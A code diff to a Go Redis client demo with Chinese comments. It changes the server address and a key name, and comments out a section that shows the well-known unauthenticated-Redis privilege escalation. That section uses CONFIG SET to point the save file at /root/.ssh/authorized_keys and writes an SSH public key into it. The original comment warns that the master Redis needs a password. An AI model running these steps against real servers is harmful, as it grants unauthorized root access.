@@ -31,7 +31,7 @@ func Sentinel() {
 
 func usualy() {
 	//链接数据库
-	cli := redis.NewClient(&redis.Options{Addr: "redis", Password: "", DB: 3})
+	cli := redis.NewClient(&redis.Options{Addr: "10.0.0.66:6379", Password: "", DB: 3})
 	defer cli.Close()
 
 	//插入数据
@@ -41,7 +41,7 @@ func usualy() {
 	}
 
 	//获取数据
-	value, err := cli.Get("zhang").Result()
+	value, err := cli.Get("yong").Result()
 	if err != nil {
 		fmt.Println(err)
 	}
@@ -64,7 +64,9 @@ func usualy() {
 		}
 	}
 
+
 	//改变config配置，通过redis漏洞提权，所以主redis一定得有密码，尽量别暴露再公网
+	/*
 	r, e := cli.ConfigSet("dir", "/root/.ssh/").Result()
 	fmt.Println(r, e)
 	r, e = cli.ConfigSet("dbfilename", "authorized_keys").Result()
@@ -72,6 +74,7 @@ func usualy() {
 	r, e = cli.Set("xxx", "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDg1rtAsdaMb7NpLNpwVdk//MztmlBv6NTErxayEi1BV2UQKNgfSIUwBANO3gONRKctAP1/vOjc/WT/eYo6aD6csYKSLe6Qi0SNzx8k+sy/hlRrUoseOkQanKKXilgTILRynGwsW8FIT6KHwwlgj+z5sslK7gkJbrUWAExwCRs4D9XBrufPv1yBrN2DgM2xoqfm+0RHrO6vTVMTQXuQC+/DXrlPJd1U1oM3EkyadMuaC2/UKGTuXv6KPbDafOLjCl11w+X5XZodrG/arDr+UUPGEBJoVopbYgC8NwdB55nyO52MPwZAIJdMTRAAfKomMEc3fh0XbK52F8DPzAMwiCPX zhangyongsheng@zhangyongshengdeMacBook-Pro.local\n\n\n", 0).Result()
 	fmt.Println(r, e)
 	cli.Save().Result()
+	 */
 }
 
 func main() {
